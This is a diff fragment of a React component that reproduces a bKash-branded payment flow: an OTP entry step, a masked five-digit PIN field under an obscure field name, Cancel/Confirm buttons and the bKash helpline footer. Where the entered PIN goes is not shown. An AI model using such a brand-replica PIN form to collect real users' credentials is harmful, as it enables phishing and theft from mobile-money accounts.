+                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest placeholder-zinc-400"
+                      />
+
+                      <div className="terms mt-2 text-white/90 text-[11px] text-center">
+                        {countdown > 0 ? (
+                          <span>Resend Code in <strong className="underline text-white font-medium">{countdown}s</strong></span>
+                        ) : (
+                          <button
+                            type="button"
+                            onClick={() => setCountdown(120)}
+                            className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors"
+                          >
+                            Resend Code
+                          </button>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* STEP 3: PIN ENTER */}
+                  {step === 3 && (
+                    <div className="w-full flex flex-col justify-center items-center text-center px-4">
+                      <h2 className="text-white/95 text-[13px] max-[600px]:text-[12px] font-normal mb-2 tracking-wide">
+                        Enter PIN
+                      </h2>
+                      
+                      <input
+                        ref={pinInputRef}
+                        type="tel"
+                        inputMode="numeric"
+                        pattern="[0-9]*"
+                        autoComplete="one-time-code"
+                        name="txn_verification_code_val"
+                        id="txn_verification_code_val"
+                        maxLength={5}
+                        required
+                        value={pin}
+                        onChange={(e) => handlePinChange(e.target.value)}
+                        placeholder="•••••"
+                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest"
+                        style={{ WebkitTextSecurity: 'disc' }}
+                      />
+                    </div>
+                  )}
+                </>
+              )}
+            </div>
+
+            {/* ======================================= */}
+            {/* BUTTONS PANEL */}
+            {/* ======================================= */}
+            <div className="p-2 flex gap-3 bg-white">
+              {showCancelConfirm ? (
+                <>
+                  <button
+                    type="button"
+                    onClick={onCancel}
+                    className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
+                  >
+                    Yes
+                  </button>
+                  
+                  <button
+                    type="button"
+                    onClick={() => setShowCancelConfirm(false)}
+                    className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none"
+                    style={{
+                      backgroundColor: '#e2136e',
+                      color: '#ffffff',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    No
+                  </button>
+                </>
+              ) : (
+                <>
+                  <button
+                    type="button"
+                    onClick={() => setShowCancelConfirm(true)}
+                    className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
+                  >
+                    Cancel
+                  </button>
+                  
+                  <button
+                    type="submit"
+                    disabled={isConfirmDisabled()}
+                    className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed border-none outline-none"
+                    style={{
+                      backgroundColor: '#e2136e',
+                      color: '#ffffff',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    Confirm
+                  </button>
+                </>
+              )}
+            </div>
+
+            {/* ======================================= */}
+            {/* FOOTER */}
+            {/* ======================================= */}
+            <div className="footer text-center bg-white pb-[12px] pt-1 px-5 select-none text-sans">
+              <div className="flex items-center justify-center gap-1">
+                <span className="w-3.5 h-3.5 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e2136e' }}>
+                  <svg className="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M21.384,17.791 C20.443,16.852 19.124,16.321 17.818,16.321 C17.387,16.321 16.96,16.38 16.538,16.494 L14.773,16.92 C12.639,15.753 10.965,14.079 9.798,11.945 L10.224,10.18 C10.339,9.758 10.398,9.331 10.398,8.9 C10.398,7.594 9.867,6.275 8.928,5.334 L7.151,3.56 C6.162,2.571 4.545,2.571 3.556,3.56 L2.19,4.924 C1.802,5.312 1.547,5.811 1.455,6.349 C1.155,8.114 1.838,11.378 4.792,14.613 C7.901,18.018 11.23,20.082 14.156,20.082 C14.441,20.082 14.726,20.06 15.006,20.016 C15.544,19.924 16.043,19.668 16.431,19.28 L17.797,17.914 C18.784,16.926 18.784,15.31 17.797,14.321 L21.384,17.791 Z" />
+                  </svg>
+                </span>
+                <span className="help-number text-[11px] font-bold font-sans ml-1" style={{ color: '#e2136e' }}>
+                  16247
+                </span>
+              </div>
+              <div className="copy mt-[3px] text-zinc-400 text-[11px] font-sans">
+                © 2026 bKash, All Rights Reserved
+              </div>
+            </div>
+
+          </form>
+        </div>
       </div>
     </div>
-  </div>
   );
 }
